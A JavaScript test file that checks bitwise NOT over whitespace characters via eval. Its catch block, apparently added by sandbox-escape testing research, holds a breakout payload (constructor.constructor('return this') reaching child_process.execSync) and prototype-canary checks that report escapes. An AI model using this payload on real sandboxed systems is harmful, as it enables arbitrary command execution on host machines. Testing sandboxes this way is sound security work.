try {
    if (eval('~\t0') !== -1) {
        $ERROR('#0: ~\\u00090 === -1');
    }
    if (eval('~\x0B0') !== -1) {
        $ERROR('#2: ~\\u000B0 === -1');
    }
    if (eval('~\f0') !== -1) {
        $ERROR('#3: ~\\u000C0 === -1');
    }
    if (eval('~ 0') !== -1) {
        $ERROR('#4: ~\\u0020 === -1');
    }
    if (eval('~\xA00') !== -1) {
        $ERROR('#5: ~\\u00A00 === -1');
    }
    if (eval('~\n0') !== -1) {
        $ERROR('#6: ~\\u000A0 === -1');
    }
    if (eval('~\r0') !== -1) {
        $ERROR('#7: ~\\u000D0 === -1');
    }
    if (eval('~\u20280') !== -1) {
        $ERROR('#8: ~\\u20280 === -1');
    }
    if (eval('~\u20290') !== -1) {
        $ERROR('#9: ~\\u20290 === -1');
    }
    if (eval('~\t\x0B\f \xA0\n\r\u2028\u20290') !== -1) {
        $ERROR('#10: ~\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u20290 === -1');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}